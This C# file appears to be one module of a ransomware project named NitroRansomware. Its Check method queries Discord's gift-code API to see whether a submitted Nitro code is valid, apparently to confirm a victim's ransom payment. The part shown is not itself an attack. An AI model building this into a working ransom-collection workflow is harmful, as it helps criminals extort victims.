using System.Net.Http;
namespace NitroRansomware
{
    class Nitro
    {
        private static Logs logging = new Logs("DEBUG", 0);
        public static bool Check(string code)
        {
            using (HttpClient client = new HttpClient())
            {
                string url = $"https://discord.com/api/v8/entitlements/gift-codes/{code}?with_application=true&with_subscription_plan=true";
                logging.Debug(url);
                var response = client.GetAsync(url);
                if (response.Result.StatusCode != System.Net.HttpStatusCode.NotFound)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

    }
}
